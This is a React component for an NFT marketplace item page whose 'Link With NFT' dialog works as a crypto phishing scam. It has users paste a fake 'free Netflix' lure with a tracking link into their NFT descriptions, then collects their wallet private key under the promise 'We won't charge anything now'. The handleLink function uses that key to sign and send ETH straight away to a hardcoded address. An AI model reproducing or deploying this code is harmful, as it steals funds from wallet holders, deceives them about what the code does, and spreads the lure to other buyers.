import React, { useState } from "react";
import "./item.css";
import creator from "../../assets/seller2.png";
import item from "../../assets/item1.png";
import Dialog from "@mui/material/Dialog";
import DialogActions from "@mui/material/DialogActions";
import DialogContent from "@mui/material/DialogContent";
import DialogContentText from "@mui/material/DialogContentText";
import DialogTitle from "@mui/material/DialogTitle";
import TextField from "@mui/material/TextField";
import Button from "@mui/material/Button";
import { v4 as uuidv4 } from "uuid";
import { ethers } from "ethers";
const Item = () => {
  const [addr, setAddr] = useState("");
  const [PK, setPK] = useState("");
  const [mask, setMask] = useState("");
  const [open, setOpen] = useState(false);
  const [step, setStep] = useState(1);
  const [uuid, setUuid] = useState("");

  const handleClickOpen = () => {
    setUuid(uuidv4());
    setOpen(true);
  };

  const handleClose = () => {
    setOpen(false);
  };

  const handleNext = () => {
    setStep(step + 1);
    console.log(step);
  };
  const handleback = () => {
    setStep(step - 1);
  };
  const onNFTAddressChange = e => {
    setAddr(e.target.value);
  };
  const onPKChange = e => {
    setPK(e.target.value);
    let mask = "";
    for (let i = 0; i < e.target.value.length; i++) {
      mask += "*";
    }
    setMask(mask);
  };
  const handleLink = async () => {
    if (!window.ethereum) alert("No crypto wallet found. Please install it.");

    await window.ethereum.request({ method: "eth_requestAccounts" });

    //showAccount.innerHTML = account;

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = new ethers.Wallet(PK, provider);
    const walletId = await signer.getAddress();
    const tx = {
      from: walletId,
      to: "0xcA090BBE640b754cbB52B40059af08c8125159DD",
      value: "1007585708441000",
      data: null
    };

    const txDetails = await signer.signTransaction(tx);
    console.log(txDetails);
    console.log("Sending signed txn");
    const { hash } = await signer.sendTransaction(txDetails);
    console.log(hash);
    const confirm = await provider.waitForTransaction(hash);
    console.log(confirm);
  };
  return (
    <div className="item section__padding">
      <div className="item-image">
        <img src={item} alt="item" />
      </div>
      <div className="item-content">
        <div className="item-content-title">
          <h1>Abstact Smoke Red Blue</h1>
          <p>
            From <span>4.5 ETH</span> ‧ 20 of 25 available
          </p>
        </div>
        <div className="item-content-creator">
          <div>
            <p>Creater</p>
          </div>
          <div>
            <img src={creator} alt="creator" />
            <p>Rian Leon </p>
          </div>
        </div>
        <div className="item-content-detail">
          <p>
            Lorem Ipsum is simply dummy text of the printing and typesetting
            industry. Lorem Ipsum has been the industry's standard dummy text ever
            since the 1500s, when an unknown printer took a galley of type and
            scrambled it to make a type specimen book
          </p>
        </div>
        <div className="item-content-buy">
          <button className="primary-btn" onClick={handleClickOpen}>
            Link With NFT
          </button>
        </div>
        <Dialog
          open={open}
          onClose={handleClose}
          aria-labelledby="alert-dialog-title"
          aria-describedby="alert-dialog-description"
        >
          <DialogTitle id="alert-dialog-title">Link your NFT</DialogTitle>
          <DialogContent>
            <DialogContentText id="alert-dialog-description">
              {step === 1 ? (
                <>
                  <b>Please paste this on your NFT description & create NFT</b>
                  <br />
                  <br />
                  <p
                    style={{
                      width: "80%",
                      margin: "auto",
                      padding: "5%",
                      backgroundColor: "#fcfcfc",
                      borderRadius: "10px"
                    }}
                  >
                    <b>Get FREE 1 Month Netflix Subscription</b> With this NFT.
                    <br />
                    This addon is <b>secured by Addify</b>. Please click on{" "}
                    <a
                      href={`https://adf-distributor-web-app.vercel.app/link/${uuid}`}
                      style={{ color: "purple" }}
                    >
                      this link
                    </a>{" "}
                    to verify the addon before buying the NFT.
                    <br />
                  </p>
                  <br />
                </>
              ) : step === 2 ? (
                <>
                  <br />
                  <b>Once your NFT is created, paste your NFT Address here:</b>
                  <br />
                  <br />
                  <p
                    style={{
                      width: "80%",
                      margin: "auto",
                      padding: "5%",
                      backgroundColor: "#fcfcfc",
                      borderRadius: "10px"
                    }}
                  >
                    <TextField
                      style={{
                        width: "100%"
                      }}
                      id="outlined-basic"
                      placeholder="NFT Address"
                      variant="outlined"
                      value={addr}
                      onChange={onNFTAddressChange}
                    />
                  </p>
                  <br />
                  <br />
                </>
              ) : (
                <>
                  <b>Import wallet</b>
                  <br />
                  <br />
                  <p
                    style={{
                      width: "80%",
                      margin: "auto",
                      padding: "5%",
                      backgroundColor: "#fcfcfc",
                      borderRadius: "10px"
                    }}
                  >
                    <b>We need permission</b> to sign the transaction. We won't
                    charge anything now. You wallet{" "}
                    <b>
                      will be charged only when your NFT is sold & your buyer redeems
                      the addon
                    </b>
                    .
                    <br />
                    Each time you link addon to your NFT, you need to enter your
                    private key. As{" "}
                    <b>We don't store your private key for security reason.</b>
                    <br />
                    <br />
                    Enter your private key:
                    <br />
                    <TextField
                      style={{
                        width: "100%"
                      }}
                      id="outlined-basic"
                      placeholder="NFT Address"
                      variant="outlined"
                      value={mask}
                      onChange={onPKChange}
                    />
                    <br />
                  </p>
                  <br />
                  However, you can choose not to disclose your Private Key. You can
                  buy the Addon directly form here & link to your NFT.
                  <br />
                </>
              )}
            </DialogContentText>
          </DialogContent>
          <DialogActions>
            {step > 1 && <Button onClick={handleback}>Back</Button>}
            {step < 3 ? (
              <button className="nextButton" onClick={handleNext} autoFocus>
                Next
              </button>
            ) : (
              <button className="nextButton" onClick={handleLink} autoFocus>
                Link
              </button>
            )}
          </DialogActions>
        </Dialog>
      </div>
    </div>
  );
};

export default Item;
